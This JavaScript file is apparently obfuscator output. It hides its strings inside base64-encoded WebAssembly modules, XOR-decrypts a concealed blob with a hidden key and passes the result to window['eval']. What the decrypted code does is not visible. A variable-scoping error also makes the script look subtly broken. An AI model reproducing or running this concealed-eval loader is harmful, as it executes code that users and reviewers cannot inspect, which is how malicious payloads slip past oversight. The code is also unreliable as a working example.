const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGl4CAgAAEfwBBAQt/AEEQC38AQfwbC38AQf4bCweqgICAAAUGbWVtb3J5AgAFZGF0YTADAAVkYXRhMQMBBWRhdGEyAwIFZGF0YTMDAwuVnICAAAQAQQELDW45aE9UM01QeUx0TQAAQRAL6hslMERUJTExISUxMWYqJTA2N3RUcE4lMUIlMDB+JTYwJTExdiU1RHMqJTAxJTIzJTBETSUwMSUyMCUzQSUxMy4lM0QlMDAlMjIxJTE4JTA5byUyNmc1VSUxQSUwQSUwRS0lMDQlM0MlMTZWJTJGJTI0JTdEJTEzNiU1RHNsVG1OTyUwOSUzRHRQJTIwKSUxNyUwOSEqOHclNUNvaSUxM28lMTglM0MlMEQ4JTA0JTIwfiUzQiUxRiUwNnolMDMlMTcuJTAzJTI2JTA2JTNEcSclMUYlMDclMUQlMEUlMUY0YyUwMyUzRENaJTA3ISUyMFYlMjMlMjRWOCUxQyglMDMlNUMlMUIlNjAlMjBBJTJDJTI2JTFDJTIwWSUyRiUwMlYlMEYoMUFtJTA0JTJDJTBCJTI2JTBDJTI2diUzQyUwQSUxOCU2MGMlMTM2JTAxVCUzQSUxOU5GKTglNUMlM0Y5JTE4JTIyJTE2JTNGJTFCJTVDJTA2JTI2JTNBVGMzJTE2IVQlMDclM0J4JTI0JTFCJTFCZCUwOCUwMi0lMUUlM0QlMEMlMjB+JTI0JTBBenAlMDIlMURZJTAxNSUwQyUyNXopJTFEJTEwJTFEJTBFJTFGNGwlMDMlM0ElMTklMTclMDIuJTNGWiUyMDIlMTYlM0YlMDBjJTFFVUglMUIlMUN2JTFCJTE5NSUwMDUlMEElMkJvLSUxQiUxMWElMDQlMUU4JTFFLSUwNSFqOCUwNiUwMHIlMDF+JTNBJTAzOW0lMjZ4OCUxRiUwRHYlMTglMDI2JTFGJTIwJTAyJTNFJTE3JTJCJTAwJTE5JTExYyUyMyUwOSUyMCUxRDlGJTFCSG0lN0QlMDglNDBaWWxUbSUwN19IZzVVJTFBJTBBJTBFLSUwNCUzQyUxNlYlMkYlMjR0JTBFcHAlNUJuJTVEbSUxNTRib3QlMTNtcFlsVCUwRjhWJTAyJTFBJTA0ZyUxRSElMTElMDQlMjI4JTI2JTE5VW92JTFEKCglMUNuTyU0MGQlMTlIb3RObTUlMTUlM0YlMTFtJTE1NGJvdCUxM21wWWxUJTBGOFYlMDIlMUElMDRnJTFFISUxMSUwNCUyMjglMjYlMTlVb3YlMUQlM0Q0JTFGbk8lNDBkJTE5SG90TnYlNURzbFRtTl8lMDclM0R0JTFCJTNCMSUwQmwlM0QlMEYlM0JXJTE4JTJDJTE1ZiglMjUlMEI1VHBOJTA5U28lMURxJTE4JTNFJTA5JTJGNSUxOCUwQkwlMUE2dCUwRm0zJTE0NSUxQSUwOCUzQiU1RSUzRSUwMSU2MCUxRCE1JTE3JTJCJTAwJTI1VSUxOSElMEQlMDElNUQlM0QzOCUxOSUxMTglMUMlNDBDZCU3RCUxMzYlNURzbFRtTiUxOUhvdEUlMkMlMjJZJTA2JTEyJTAzJTFFbCUyNCUwOCUyNHYoISUxMyUxRlRwTlclMEQ4dHIuJTI0JTEwJTNBJTExJTE1ISU1QiUwMio3R2VyLiUxRiUxNyUzRiUwN0klMUNhJTA3JTVCKCUzQyUxNW4lNUR2YzNIb3QlMTNtcFlsNSUwNiFzMiUxNSUyNCU3QiUxNyUwMllxVCUwNyUwOHclMTglMUElMTh0JTNEJTE1JTFDJTNEJTFFJTFFJTQwJTdDJTEwJTNGNSU1RCklMTUlMTclM0ElMUQlM0YlMDFXJTA1KiUzQUclMUUlMjQlMEIlMjUlMUEqJTFEJTExSmolMDB2JTAwJTAwJTVDbiU1RG1FJTE5SiUxMyUwOCUxMW0lN0JZJTAxJTE1OSUwNiUxNyUxQSUyMCElNUQpeEgpTG1EJTE5JTI1LiUyMCU1QmMlMjIlMTglMjIlMTAlMjIlMDMlMTFBZnQlMThtJTEyJTJGJTIzJTFFJTE4JTNFbSUzQiUzRSUzQyU3QiUxQiUyNTF3eUdOJTE5SG90JTEzbXAlMTAlMDclMDUlMjMlM0VpSHJ0VSUyQyUzQyUwQSlPJTQwZCUxOUhvdCUxM21wWSUyRiUxOTQlMDAlN0MlM0QoJTAyJTdEJTdEcERsJTFBKCUxOSUxOSklMkMlMjBaJTNCNSElMDMlMTYnJTBCWiUxQ2d2fiUxRSUwODQlMDBGYzZ0JTI0JTA3JTAwZyUxRHJQd3lHTiUxOUhvdCUxM21wJTFBISUwRCUyMyUyQmwlMEYlMTklMUElMDNjJTNGJTE3JTNFJTExJTJDJTBBJTQwJTFCJTNCNUcoMyUxMS0lMUEqJTBCJTE5VW8yRiUyMzMlMEQlMjUlMUIlMjNGJTEwSDRZOW1wWWxUbU4lMTlIb3QlMTMlMjQ2WWQlNDBtUyUwNEglMkM5SiUyMyUxNSUyQyUyQiUyMiUwMyU1RSUxNyUxQSo1VzQlMDMlMEQtJTAwKE4lMUZOb2YlMDMlN0RwRHFULiUwMyU0MCUwNiUwQSUwMVQlMUIlMUVJYiUwNzklMEZNJTFEJTNDJTdEJTEzNiU1RHNsVG1OJTE5SG90JTEzbXBZbFRtTk8lMDklM0R0UCUyMCklMTclMDkhKjh3WW9pJTEzJTIzNSUwRWw1LiUxQVAlMUUqJTBDJTdDJTJGJTNBJTFDJTJGJTAwZUx4JTJDJTAwJTEwcWMlMDMlMEQlM0UlMTElMkMlMDMlMUJBdFk5bXBZbFRtTiUxOUhvdCUxM21wWWwlMUQlMkJOJTExJTBCJTIyLSU1RCUwOCUwNSUxRSUxQSUzQSU3QyU0MFYlMTgqJTNBJTFCZCU3Q1klMkYlMTk0JTAwJTdDJTNEKCUwMiU3RCU3Q34lMEQ1JTA0KE4lMDRIfnglMTMuJTNEJTAwJTIyMSUxOCUwOW8lMjZ+ekQlM0Y5JTBEKSU1Qy4lMDMlNDAlMDYlMEElMDFUJTFCJTFFSWIlMjYoJTFESSUwNyEnViUwRiUzRiUxRDUlNURhTiUwQyUwRCU3Q3QlMEZtMyUxNDUlMUElMDglM0IlNUUlM0UlMDFlJTFEJTNFOSUwMyklNURtJTE1NGJvdCUxM21wWWxUbU4lMTlIb3QlMTNtcFlsVCUyNCUyNUglMDYlMUYlMDQlMTNwcCUwRCUzRSUwMShVNGJvdCUxM21wWWxUbU4lMTlIb3QlMTNtcFlsVC4lMDMlNDAlMDYlMEElMDFUJTFCJTFFSGIlMDQlMjIlMURQJTFDJTI2JTNCJTVEbW1ZJTdDTyU0MGQlMTlIb3QlMTNtcFlsVG1OJTE5SG90JTEzbXBZJTJGJTE5NCUwMCU3QyUzRCglMDIlN0QlN0N+JTBBLSUwMiglM0FWLiUyNjhWZSUxMTIlMDMlM0UlMTc0SSUyMCUxNSUwNiUxRm1iUHd5R04lMTlIb3QlMTNtcFlsVG1OJTE5SG90JTEzbXAlMEQlM0UlMERtJTE1NGJvdCUxM21wWWxUbU4lMTlIb3QlMTNtcFlsVG1OJTE5SCUwNTIlN0QlM0QlMDU1JTBCJTA0JTA4JTBCSCUwMiUxQ3phOCUzRVElMEQlM0YlMDIlMjRjMiUzRiUxQ2klMUYlN0NZJTdEWG0lNUUlMTBlRXQlMTNtcFlsVG1OJTE5SG90JTEzbXBZbFRtJTEzJTE5JTBCLiUyMFAlMjVwUSUyRiUxOTQlMDAlN0MlM0QoJTAyJTdEJTdGeVk3JTA5JTQwZCUxOUhvdCUxM21wWWxUbU4lMTlIb3ROJTQwWllsVG1OJTE5SG90JTEzbXBZbFRtJTBEVCUxMSElMTFmKiUwNjclN0RaLiUwMlYlMUIqJTdDJTFBJTQwWllsVG1OJTE5SG90JTEzbXAlMDRBfm1OJTE5SG90JTEzbS1CQX5tTiUxOUhvdCUxM20lMjQlMEI1VDZjM0hvdCUxM21wWWxUbU4lMTklMEIlMjItJTVEJTA4JTA1JTFFJTFBJTNBJTdEJTQwViUxOColM0ElMUJvJTE3JTNDJTE4VmFOJTFCJTAwJTNCJTIwQ3clN0ZWblRmTlolMDU2JTNBdiUxODclMkYlMDIlNDAlMTYnJTdCJTNEISUyNFAlMEMlMDUlMUM5JTA2NDMlMTlDb3YlMUMqNSUwRGIlMDQlMjUlMUUlMDYlM0YtJTNBRiUyQm0lNUJsX20lMjNYJTFDJ3pBJTJDJTNFJTFEJTIzJTE5ZUclMTlDb3YlMTUlMjY1JTAwcVZtRSUxOSUwQiUyMi0lNUQlMDglMDUlMUUlMUElM0F1TiUxMkguMmQlMTcnJTE4JTNDJTA1NSUwMX4lMDNjdFUlMkMlM0MlMEEpJTVEdmMzSG90JTEzbXBZbFRtTiUxOSUwQiUyMi0lNUQlMDglMDUlMUUlMUElM0ElN0QlNDBKJTBEITAlMUJka3RGVG1OJTE5SG90JTEzMHAlMUEtJTAwLiUwNiUxOSU0MCUyQzlKJTIzJTE1JTJDJTJCJTIyJTAzJTVEJTEwSDQpJTNFR3BZbFRtTiUxOUglMjYyJTEzZTkyJTNEJTFBJTFEJTNFJTEwSDRZOW1wWWxUbU4lMTlIb3QlMTMlMkYlMjIlMUMtJTFGdmMzSG90JTEzbXBZbCUwOXZjM0hvdCUxMzBrdEYlMDl2YzMlMEIlMjItJTVEJTA4JTA1JTFFJTFBJTNBZUwlMUJBdFk5LiUzRCUwMCUyMjElMTglMDlvJTI2Z3YlMTUlM0Q0JTFGcSUzQyUwMilXMSUzRiUwQ1olMDYyJTJGJTFEJTNEJTFBTCUxMFMAAEH8GwsBAABB/hsLBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var key = lS(0, 0);
var b = lS(0, 1);
(() => {
    var IFwDJ5 = lS(0, 2), IFwDJ6 = 0, IFwDJ7 = 0;
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return IFwDJ6 < b.length ? 1 : 0;
            },
            update: () => {
                IFwDJ6++;
            },
            body: () => {
                IFwDJ5 += String.fromCharCode(b.charCodeAt(IFwDJ6) ^ key.charCodeAt(IFwDJ7)), IFwDJ7++, IFwDJ7 == key.length && (IFwDJ7 = 0);
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
window[lS(0, 3, true)](IFwDJ5);